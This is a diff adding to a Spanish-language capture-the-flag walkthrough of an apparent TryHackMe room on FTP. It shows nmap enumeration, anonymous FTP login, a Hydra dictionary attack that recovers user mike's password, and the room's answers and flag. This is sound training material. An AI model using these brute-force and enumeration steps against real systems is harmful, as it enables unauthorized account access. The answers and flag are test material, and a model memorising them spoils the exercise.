@@ -432,6 +432,9 @@ Puede encontrar más detalles sobre la función técnica y la implementación de
 Antes de comenzar, asegúrese de implementar la sala y darle un tiempo para que arranque. Tenga en cuenta que esto puede llevar hasta 5 minutos, así que tenga paciencia.
 
 ### Enumeración
+
+<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red/Enumerar-FTP.png">
+
 A esta altura, no creo que sea necesario explicar más sobre la enumeración; es clave al atacar servicios y protocolos de red. A esta altura, ya debería tener suficiente experiencia con nmap para poder escanear puertos de manera efectiva. Si se queda atascado al usar alguna herramienta, siempre puede usar `tool [-h / -help / --help]` para obtener más información sobre su función y sintaxis. De igual modo, las páginas `man` son extremadamente útiles para este propósito. Se puede acceder a ellas usando ``man [tool]`.
 
 ### Método
@@ -447,14 +450,250 @@ Ahora que conocemos nuestra caja de herramientas, hagámoslo.
 
 ### Responda las preguntas a continuación
 - Ejecute un análisis de nmap de su elección.
-- ¿Cuántos puertos están abiertos en la máquina destino?
-- ¿En qué puerto se está ejecutando FTP?
-- ¿Qué variante de FTP se está ejecutando en él?
 
-Genial, ahora que sabemos con qué tipo de servidor FTP estamos tratando, podemos verificar si podemos iniciar sesión de forma anónima en el servidor FTP. Podemos shacer esto escribiendo `ftp [IP]` en la consola e ingresando `anonymous` y sin contraseña cuando se nos solicite.
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ nmap -A -Pn -T4 -p- 10.10.207.46
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 01:41 EDT
+Stats: 0:16:35 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 68.09% done; ETC: 02:05 (0:07:46 remaining)
+Nmap scan report for 10.10.207.46
+Host is up (0.20s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.0.115
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: Host: Welcome
 
-- ¿Cuál es el nombre del archivo en el directorio FTP anónimo?
-- ¿Cuál creemos que podría ser un posible nombre de usuario?
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1459.30 seconds
+```
+
+- ¿Cuántos puertos están abiertos en la máquina destino? `2`
+- ¿En qué puerto se está ejecutando FTP? `21`
+- ¿Qué variante de FTP se está ejecutando en él? `vsftpd`
+
+Genial, ahora que sabemos con qué tipo de servidor FTP estamos tratando, podemos verificar si podemos iniciar sesión de forma anónima en el servidor FTP. Podemos hacer esto escribiendo `ftp [IP]` en la consola e ingresando `anonymous` y sin contraseña cuando se nos solicite.
+
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ ftp 10.10.207.46
+
+Connected to 10.10.207.46.
+220 Welcome to the administrator FTP service.
+Name (10.10.207.46:kali): anonymous
+331 Please specify the password.
+Password: 
+
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+
+- ¿Cuál es el nombre del archivo en el directorio FTP anónimo? `PUBLIC_NOTICE.txt`
+- ¿Cuál creemos que podría ser un posible nombre de usuario? `Mike`
+
+```text
+ftp> ls
+229 Entering Extended Passive Mode (|||26561|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+226 Directory send OK.
+
+ftp> get PUBLIC_NOTICE.txt
+local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
+229 Entering Extended Passive Mode (|||20787|)
+150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
+100% |**************************************************************************************************************************|   353       94.80 KiB/s    00:00 ETA
+226 Transfer complete.
+353 bytes received in 00:00 (1.35 KiB/s)
+
+ftp> 
+```
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ cat PUBLIC_NOTICE.txt 
+===================================
+MESSAGE FROM SYSTEM ADMINISTRATORS
+===================================
+
+Hello,
+
+I hope everyone is aware that the
+FTP server will not be available 
+over the weekend- we will be 
+carrying out routine system 
+maintenance. Backups will be
+made to my account so I reccomend
+encrypting any sensitive data.
+
+Cheers,
+
+Mike
+```
 
 ¡Genial! Ahora tenemos detalles sobre el servidor FTP y, fundamentalmente, un posible nombre de usuario. Veamos qué podemos hacer con eso...
 
+## Explotación de FTP
+### Tipos de explotación
+De manera similar a Telnet, cuando se utiliza FTP, tanto los canales de comandos como los de daatos no están cifrados. Cualquier dato enviado a través de estos canales puede ser interceptado y leído.
+
+<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red/Explotando-FTP.png">
+
+Dado que los datos de FTP se envian en texto sin formato, si se produjera un ataque de intermediario, un atacante podría revelar cualquier cosa enviada a tarvés de este protocolo (como contraseñas). Un artículo escrito por [JSCape](https://www.jscape.com/blog/countering-packet-sniffers-using-encrypted-ftp) demuestra y explica este proceso utilizando ARP-Poisoning para engañar a una víctima para que envíe información confidencial a un atacante, en lugar de a una fuente legítima.
+
+Al observar un servidor FTP desde la posición en la que nos encontramos con esta máquina, una vía que podemos explotar son las configuraciones de contraseñas débiles o predeterminadas.
+
+### Desglose del método
+Por lo tanto, desde nuestra etapa de enumeración, sabemos:
+- Hay un servidor FTP ejecutándose en esta máquina
+- Tenemos un posible nombre de usuario
+
+USando esta información, intentemos obtener por fuerza bruta la contraseña del servidor FTP.
+
+### Hydra
+Hydra es una herramienta de descifrado de contraseñas en línea muy rápida, que puede realizar ataques de diccionario rápidos contra más de 50 protocolos, incluidos Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, varias bases de datos y mucho más. Hydra ya está instalada en AttackBox, sin embargo, si la necesitas en tu propia máquina atacante, puedes emcontrar el repositorio de Github [aquí]().
+
+La sintaxis del comando que vamos a utilizar para encontrar las contraseñas es la siguiente:
+
+```text
+hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+```
+
+Vamos a desglosarlo:
+
+<table align="center">
+    <tr>
+        <th>Sección</th>
+        <th>Función</th>
+    </tr>
+    <tr>
+        <td>hydra</td>
+        <td>Ejecuta la herramienta hydra.</td>
+    </tr>
+    <tr>
+        <td>-t 4</td>
+        <td>Número de conexiones paralelas por objetivo</td>
+    </tr>
+    <tr>
+        <td>-l [usuario] </td>
+        <td>Apunta al usuario cuya cuenta estás tratando de comprometer.</td>
+    </tr>
+    <tr>
+        <td>-P [ruta al diccionario] </td>
+        <td>Apunta al archivo que contiene la lista de posibles contraseñas.</td>
+    </tr>
+    <tr>
+        <td>-vV</td>
+        <td>Establece el modo verboso, muestra la combinación de nombre de usuario y contraseña para cada intento.</td>
+    </tr>
+    <tr>
+        <td>[IP de la máquina] </td>
+        <td>La dirección IP de la máquina objetivo</td>
+    </tr>
+    <tr>
+        <td>ftp / protocolo</td>
+        <td>Establece el protocolo</td>
+    </tr>
+</table>
+
+¡Descifremos algunas contraseñas!
+
+### Responda las preguntas a continuación
+- ¿Cuál es la contraseña del usuario "mike"? `password`
+
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt.gz -vV 10.10.207.46 ftp
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 02:14:14
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ftp://10.10.207.46:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.207.46 - login "mike" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.207.46 - login "mike" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.207.46 - login "mike" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.207.46 - login "mike" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[21][ftp] host: 10.10.207.46   login: mike   password: password
+[STATUS] attack finished for 10.10.207.46 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 02:14:30
+```
+
+¡Bingo! Ahora, conectémonos al servidor FTP como este usuario usando `ftp [IP]` e ingresando las credenciales cuando se nos solicite
+
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ ftp 10.10.207.46
+Connected to 10.10.207.46.
+220 Welcome to the administrator FTP service.
+
+Name (10.10.207.46:kali): mike
+331 Please specify the password.
+Password: 
+230 Login successful.
+
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||22807|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
+-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
+226 Directory send OK.
+
+ftp> get ftp.txt
+local: ftp.txt remote: ftp.txt
+229 Entering Extended Passive Mode (|||54117|)
+150 Opening BINARY mode data connection for ftp.txt (26 bytes).
+100% |**************************************************************************************************************************|    26       32.80 KiB/s    00:00 ETA
+226 Transfer complete.
+26 bytes received in 00:00 (0.07 KiB/s)
+
+ftp> exit
+221 Goodbye.
+```
+```text
+┌──(kali㉿kali)-[~/Desktop/4rlekiing]
+└─$ cat ftp.txt  
+THM{y0u_g0t_th3_ftp_fl4g}
+```
+
+- ¿Qué es ftp.txt? `THM{y0u_g0t_th3_ftp_fl4g}`
+
+## Ampliar tus conocimientos
+### Aprender más
+No existe una lista de cosas que debes aprender hasta que hayas aprendido oficialmente todo lo que puedas. Siempre habrá cosas que nos sorprendan a todos, especialmente en los problemas lógicos a veces abstractos de los desafíos de capturar la bandera. Pero, como en todo, la práctica hace al maestro. Todos podemos recordar las cosas que hemos aprendido después de completar un desafío y espero que sientas lo mismo con respecto a esta sala.
+
+### Lectura
+A continuación, se incluyen algunas cosas que pueden resultar útiles para leer después de completar esta sala, si le interesan:
+
+- [medium.com](https://gregit.medium.com/exploiting-simple-network-services-in-ctfs-ec8735be5eef)
+- [attack.mitre.org](https://attack.mitre.org/techniques/T1210/)
+- [nextgov.com](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
+
+### Gracias
+Gracias por tomarse el tiempo para trabajar en esta sala, le deseo la mejor de las suertes en el futuro. *Polo*
+
+### Responda las preguntas a continuación
+- ¡Bien hecho, lo logró!
